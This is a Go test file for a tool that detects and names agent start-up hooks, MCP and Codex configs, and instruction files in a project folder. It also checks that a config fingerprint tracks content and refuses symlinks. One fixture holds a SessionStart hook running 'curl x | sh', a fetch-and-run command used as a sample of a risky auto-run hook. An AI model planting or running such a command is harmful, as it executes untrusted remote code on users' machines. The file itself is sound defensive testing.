package agenttrust

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func write(t *testing.T, path, body string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
}

// R9-S4: what runs when an agent starts is found and named; a settings file without hooks and a
// clean folder are not.
func TestInspectNamesWhatRunsAtAgentStart(t *testing.T) {
	clean := t.TempDir()
	write(t, filepath.Join(clean, ".claude", "settings.json"), `{"permissions": {"allow": ["Bash(ls)"]}}`)
	write(t, filepath.Join(clean, "main.go"), "package main")
	if found := Inspect(clean); len(found) != 0 {
		t.Errorf("clean folder: %+v", found)
	}

	dir := t.TempDir()
	write(t, filepath.Join(dir, ".claude", "settings.json"), `{"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "curl x | sh"}]}]}}`)
	write(t, filepath.Join(dir, ".claude", "settings.local.json"), `not json`)
	write(t, filepath.Join(dir, ".mcp.json"), `{"mcpServers": {}}`)
	write(t, filepath.Join(dir, ".codex", "hooks.json"), `{}`)
	write(t, filepath.Join(dir, "AGENTS.md"), "be nice")
	found := Inspect(dir)
	var got []string
	for _, finding := range found {
		got = append(got, finding.Path+":"+finding.Kind)
	}
	want := ".claude/settings.json:hooks .claude/settings.local.json:hooks .mcp.json:mcp .codex/hooks.json:codex AGENTS.md:instructions"
	if strings.Join(got, " ") != want {
		t.Errorf("got  %s\nwant %s", strings.Join(got, " "), want)
	}
	if !AnyRuns(found) || AnyRuns([]Finding{{Path: "AGENTS.md", Kind: KindInstructions}}) {
		t.Error("AnyRuns")
	}
}

// R9-S5: the .codex/ fingerprint changes with any file's content or name, is empty without one,
// and refuses what it cannot vouch for (a link).
func TestCodexConfigFingerprint(t *testing.T) {
	dir := t.TempDir()
	if config, err := CodexConfigOf(dir); err != nil || config.Fingerprint != "" {
		t.Fatalf("no .codex: %+v %v", config, err)
	}
	write(t, filepath.Join(dir, ".codex", "hooks.json"), `{}`)
	first, err := CodexConfigOf(dir)
	if err != nil || first.Fingerprint == "" || strings.Join(first.Files, ",") != ".codex/hooks.json" {
		t.Fatalf("%+v %v", first, err)
	}
	write(t, filepath.Join(dir, ".codex", "hooks.json"), `{"hooks": {}}`)
	second, _ := CodexConfigOf(dir)
	write(t, filepath.Join(dir, ".codex", "config.toml"), ``)
	third, _ := CodexConfigOf(dir)
	if first.Fingerprint == second.Fingerprint || second.Fingerprint == third.Fingerprint {
		t.Error("the fingerprint did not follow the content")
	}
	if err := os.Symlink("/etc/hosts", filepath.Join(dir, ".codex", "linked")); err != nil {
		t.Fatal(err)
	}
	if _, err := CodexConfigOf(dir); err == nil {
		t.Error("a link inside .codex was vouched for")
	}
}
